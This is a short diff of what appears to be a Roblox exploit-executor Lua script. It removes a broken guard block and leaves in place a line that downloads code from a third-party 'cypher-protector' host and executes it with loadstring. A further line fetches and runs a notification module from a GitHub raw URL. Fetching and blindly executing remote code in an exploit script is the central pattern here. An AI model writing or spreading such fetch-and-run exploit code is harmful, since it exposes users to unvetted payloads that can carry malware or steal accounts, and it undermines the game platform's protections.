@@ -1,9 +1,5 @@
 loadstring(game:HttpGet("https://cypher-protector.vercel.app/api/load/kurkurkurkurkur"))()
 
-if getgenv().isCool = false then
-   return
-end
-
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/gregsixseven/sixone/refs/heads/main/notification.luau", true))()
